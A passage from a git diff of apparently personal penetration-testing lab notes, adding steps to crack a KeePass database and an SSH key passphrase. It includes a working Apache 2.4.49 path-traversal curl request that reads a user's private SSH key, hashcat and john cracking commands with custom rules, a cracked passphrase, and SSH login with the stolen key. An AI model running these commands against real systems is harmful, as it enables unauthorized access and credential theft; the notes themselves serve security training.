@@ -1432,11 +1432,31 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     keepass2john Database.kdbx > keepass.hash
     cat keepass.hash`  remove the "Database"
     hashcat --help | grep -i "KeePass"
-    hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+    hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force  
     ```
-  - ddd
-  
-  
+  - SSH passphrase for user 'alfred'
+    - `searchsploit "Apache 2.4.49"` > HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
+    - `curl --path-as-is http://192.168.161.201/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/alfred/.ssh/id_rsa -o id_rsa`  
+    - crack password by using john: Superstar137!  
+      ```
+      nano ssh.rule
+      [List.Rules:sshRules]
+      c $1 $3 $7 $!  
+      c $1 $3 $7 $@  
+      c $1 $3 $7 $#  
+      
+      ssh2john id_rsa > ssh.hash
+      hashcat -h | grep -i "ssh"
+      hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
+      sudo sh -c 'cat /home/kali/offsec/passwordattacks/ssh.rule >> /etc/john/john.conf'
+      john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules ssh.hash
+      ```
+   - ssh with the cracked passphrase
+     ```
+     rm ~/.ssh/known_hosts
+     chmod 600 id_rsa
+     ssh -i id_rsa -p 2223 alfred@192.168.161.201
+     ```
 - 16.2.1
 
 ## Penetration testing report 
